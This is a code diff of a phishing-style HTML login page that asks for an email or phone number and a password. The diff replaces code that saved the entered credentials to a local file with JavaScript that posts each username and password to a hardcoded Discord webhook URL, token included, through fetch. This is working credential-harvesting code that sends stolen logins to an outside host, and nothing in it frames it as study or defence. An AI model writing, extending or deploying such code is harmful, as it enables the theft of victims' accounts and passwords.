@@ -21,7 +21,7 @@
         <br/>
         Email or Phone number:
         <br/>
-        <!-- Note: We remove the "action" and "method" attributes because no backend is used -->
+        <!-- Remove action/method since we're handling submission via JavaScript -->
         <form id="saveForm" onsubmit="handleFormSubmit(event)">
           <input type="text" name="user" id="user" class="inputs" required />
           <br/>
@@ -35,43 +35,48 @@
     </center>
     
     <script>
-      // We cannot truly obtain the client’s IP with client‐side JavaScript,
-      // so we use a placeholder value.
+      // Replace this with your actual Discord webhook URL.
+      const webhookUrl = 'https://discord.com/api/webhooks/1338297079730016389/Wl7ijongjwRC-t8gz5H12JfI3YQMYxI8FnEp7VAtP-e_XgREUzPfzIOZzarrJYkCzftL';
+
+      // Since we cannot reliably obtain the client's IP from the browser,
+      // we use a placeholder string.
       const iptoken = "Client_IP";
 
-      // This variable will accumulate the data to be saved.
-      // (If you only expect one submission per page load, this will contain just that entry.)
-      let savedData = "";
-
-      // This function handles the form submission event.
+      // This function handles the form submission.
       function handleFormSubmit(event) {
-        event.preventDefault(); // Stop the form from submitting normally
-
-        // Get the input values from the form
+        event.preventDefault(); // Prevent the default form submission (page reload)
+        
+        // Retrieve the user input values.
         const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
-
-        // Append the new entry to savedData in the desired format.
-        // (You can customize the formatting as needed.)
-        savedData += " - IP: " + iptoken + "   Username: " + user + "   Password: " + pass + "\n\n";
-
-        // Optionally clear the form (if you expect multiple entries)
-        document.getElementById('saveForm').reset();
-
-        // Create a Blob from the accumulated data and trigger an automatic download.
-        const blob = new Blob([savedData], { type: 'text/plain' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = "savetext.txt";
         
-        // Append the anchor to the document, trigger a click to start download, then remove it.
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+        // Construct the message string. You can adjust formatting as needed.
+        const message = `- IP: ${iptoken}   Username: ${user}   Password: ${pass}`;
+        
+        // Create the payload object required by Discord. The simplest payload uses the "content" field.
+        const payload = {
+          content: message
+        };
 
-        // Clean up the object URL.
-        URL.revokeObjectURL(url);
+        // Send the POST request to the Discord webhook.
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log("Message sent to Discord webhook.");
+            // Optionally, you could perform further actions here, like redirecting the user.
+          } else {
+            console.error("Error sending message to Discord webhook.");
+          }
+        })
+        .catch(error => {
+          console.error("Fetch error: ", error);
+        });
       }
     </script>
   </body>
